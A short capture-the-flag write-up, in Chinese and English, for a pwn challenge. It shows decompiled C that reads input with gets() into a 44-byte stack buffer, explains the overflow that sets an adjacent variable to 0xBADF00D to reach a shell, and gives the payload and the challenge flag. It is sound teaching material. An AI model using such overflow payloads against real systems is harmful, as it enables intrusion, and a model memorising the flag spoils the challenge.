# I ate something bad

## 題目描述

Give me some food, but don't give me bad food.

nc chal.thjcc.org 11037

## 解題思路

用 ida 看

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE v4[44]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+2Ch] [rbp-4h]

  v5 = 0;
  setbuf(stream: stdin, buf: nullptr);
  setbuf(stream: stdout, buf: nullptr);
  setbuf(stream: stderr, buf: nullptr);
  puts(s: "what do you want to eat?");
  gets(a1: v4);
  if ( v5 == 0xBADF00D )
  {
    puts(s: "Why you eat this food?");
    system(command: "/bin/sh");
  }
  else
  {
    puts(s: "yammy it is not bad food!");
  }
  return 0;
}
```

可以看到 `gets(v4)` 只在換行才停，所以想寫多少 byte 都可以，`v5` 就緊接在 `v4` 後面 (`0x2C = 44`，剛好等於 `v4` 的大小)，往前多寫 4 個 byte 就直接碰到 `v5`，所以 payload 就是把 44 個 byte 填滿 `v4`，接著補上 `0xBADF00D`

```python
b"A" * 44 + p32(0x0BADF00D)
```

## Flag

```text
THJCC{m4yb3_1_34t_t0_much}
```
